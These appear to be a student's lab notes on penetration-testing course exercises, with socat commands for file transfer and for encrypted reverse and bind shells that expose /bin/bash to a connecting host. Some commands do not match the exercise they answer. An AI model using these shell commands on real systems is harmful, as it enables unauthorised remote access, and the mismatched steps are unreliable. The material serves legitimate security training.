# 4.2.5 exercises
#### Exercises

_(To be performed on your own Kali and Windows 10 lab client machines - Reporting is required for these exercises)_

1.  Use **socat ** to transfer **powercat.ps1 ** from your Kali machine to your Windows system. Keep the file on your system for use in the next section.
host
`sudo socat TCP4-LISTEN:443,fork file:powercat.ps1`
recipient
`socat TCP4:192.168.119.249:443 file:received_powercat.ps1,create`
![[Pasted image 20220218121253.png]]

2.  Use **socat ** to create an encrypted reverse shell from your Windows system to your Kali machine.
generate the key
`openssl req -newkey rsa:2048 -nodes -keyout bind_shell.key -x509 -days 362 -out bind_shell.crt`
combine .key and .crt into .pem
`cat bind_shell.key bind_shell.crt > bind_shell.pem`
create listener using .pem and execute shell
`sudo socat OPENSSL-LISTEN:443,cert=bind_shell.pem,verify=0,fork EXEC:/bin/bash`
connect 
`socat - OPENSSL:192.168.119.249:443,verify=0`
![[Pasted image 20220218122213.png]]
3.  Create an encrypted bind shell on your Windows system. Try to connect to it from Kali without encryption. Does it still work?
use previously generated .pem
start socat listener
`socat -d -d OPENSSL-LISTEN:443,cert=shell.pem,verify=0 STDOUT`
target windows machine do a callback using socat
`socat OPENSSL:192.168.119.218:443,verify=0 EXEC:/bin/bash`

4.  Make an unencrypted **socat ** bind shell on your Windows system. Connect to the shell using Netcat. Does it work?

